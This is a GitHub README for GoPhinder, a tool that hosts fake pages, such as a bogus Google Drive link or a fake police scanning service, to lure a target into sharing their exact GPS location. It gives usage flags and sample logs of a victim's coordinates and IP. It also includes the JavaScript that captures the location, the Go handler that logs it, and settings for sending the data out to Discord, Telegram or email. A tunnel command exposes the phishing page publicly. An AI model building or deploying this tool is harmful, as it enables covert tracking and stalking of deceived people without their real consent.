<div align="center">
  <img src="./assets/logo.png" alt="GoPhinder" />
  <h1><strong>GoPhinder</strong></h1>
  <p>📍 Social Engineering Accurate Tracking of Devices 📍</p>
</div>

Inspired by [seeker](https://github.com/thewhiteh4t/seeker), this concept is much like phishing for credentials, but instead for precise GPS details. With the ease of capturing gps details via javascript, crafting an enticing website for a given target to grant location based permissions is one of many social engineering strategies.

# Usage
```bash
Usage of ./finder:
  -h	Show usage
  -p int
    	Web Server port (default 8080)
  -t string
    	Path to template file (default "templates/index.html")
```

## Output
```bash
[+] Server running on http://localhost:8080
┌──[Access Log]────────────[2025-05-01 22:56:55]
│ [+] Language     : en-US,en;q=0.9
│ [+] Referer      : http://localhost:8080/
│ [+] IP Address   : ::1
│ [+] User-Agent   : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15
└─────────────────────────────────────────────────────

┌──[Location Log]────────────[2025-05-01 23:04:24]
│ [+] Longitude    : xxxx
│ [+] Google Maps  : https://maps.google.com/?q=xxxx,xxxx
│ [+] IP Address   : ::1
│ [+] Latitude     : xxxx
└───────────────────────────────────────────────────────
```

## Additional output
Additional logging/output can be attained and pushed to stdout with ease.
An approach can look like such:
```golang
func HandleTrack() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var data struct { // gets data form json response form webpage
            Lat float64 `json:"lat"`
            Lon float64 `json:"lon"`
        }
		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
			log.Printf("JSON decode error: %v", err)
			http.Error(w, "Bad Request", http.StatusBadRequest)
			return
		}

		ip := utils.GetIP(r) // get the ip
		fields := map[string]string{ // create map
			"IP Address":  ip, // can be anything
			"Latitude":    fmt.Sprintf("%.6f", data.Lat),
			"Longitude":   fmt.Sprintf("%.6f", data.Lon),
			"Google Maps": fmt.Sprintf("https://maps.google.com/?q=%.6f,%.6f", data.Lat, data.Lon),
		}
		logging.LogBlock("Location Log", fields) // push to the log
		w.WriteHeader(http.StatusOK) // push 200 back to client
	}
}
```

# Templates
Default templates can be found in the *templates* directory
* Fake Google Drive Access Link
* Fake Emergency/Police Local Scanning Service
* Fake Private Event Finder

By default, the templates only gather location based information as seen below
```javascript
navigator.geolocation.getCurrentPosition(function(position) { // get exact location
    fetch(window.location.origin + "/track", { // send to backend
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            lat: position.coords.latitude,
            lon: position.coords.longitude
        })
    });
});
```

You can **add/customize** templates as needed, throw in a button click to execute, or do what you please!
The idea is to not have something so suspicious in terms of the context within the page.

## External Logging
1. A discord webhook can be specified to automatically send logs.
2. An email can be specified to automatically retain logs.
3. Telegram can be specified to retain logs.
4. A webhook URL can be specified to retain logs.

## External Exfiltration
To get automatic updates elsewhere, you can specify your *discord webhook, telegram token, and email credentials*. This can be done by editing the **config.json** file.
```json
{
  "discord": {
    "enabled": false,
    "webhook_url": "https://discord.com/api/webhooks/..."
  },
  "telegram": {
    "enabled": false,
    "bot_token": "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11",
    "chat_id": "987654321"
  },
  "email": {
    "enabled": false,
    "smtp_host": "smtp.gmail.com",
    "smtp_port": 587,
    "username": "your@email.com",
    "password": "yourpassword",
    "to": "recipient@email.com"
  }
}
```

By **default**, the exfiltration methods are set to false, but one can enable as many as needed.

## Screenshot
<img src="./assets/example.png" alt="GoPhinder" />

# tunneling
Tunneling like the classic way goes can be as followed:
```bash
# cloudflared must be installed prior ideally
cloudflared tunnel --url http://localhost:8080
```

# Contributions
Contributions are very welcomed for additional functionality, or templates!# GoPhinder
